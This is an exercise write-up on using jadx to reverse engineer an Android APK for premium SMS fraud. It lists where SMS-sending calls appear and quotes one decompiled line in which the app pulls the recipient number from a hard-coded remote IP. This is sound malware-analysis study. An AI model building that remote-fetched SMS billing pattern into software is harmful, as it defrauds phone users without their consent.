## Exercise 2 - Reverse Engineer the DEX
Continuing from [Exercise 1: Beginning Reverse Engineering with `jadx`](day_029.md). Reverse engineer `ThaiCamera.apk` to determine if it is doing premium SMS fraud.

### Goals
* Learn to analyze the Java decompilation of the DEX bytecode in `jadx` to understand what the Android application is doing.
* Experience how Android malware analysts apply reverse engineering to their context
* Determine if:
  * the Android application is sending an SMS message
  * that SMS message is going to a premium number
  * there is an obvious disclosure
  * the SMS message is only sent to the premium number after user consent

### Steps to Solution
I found three places in `Loading.java` where `sendMessage(...)` was called. 
* Two calls in `onCreate(...)`
* one in `onRequestPermissionsResult(...)`
* The app requests the `SEND_SMS` permission
* The receiving phone number (the `mobile` parameter passed to [`sendTextMessage(...)`](https://developer.android.com/reference/android/telephony/SmsManager#sendTextMessage)) is retrieved via an API call to an IP address - `HttpURLConnection urlConnection = (HttpURLConnection) new URL("http://139.59.107.168:8088/appsharejson?code=" + code).openConnection();`

### Notes
* A [Premium SMS number](https://www.infobip.com/glossary/premium-sms-number) is a 3-7 digit number used for messaging that charges a premium price to the end user per sent SMS.
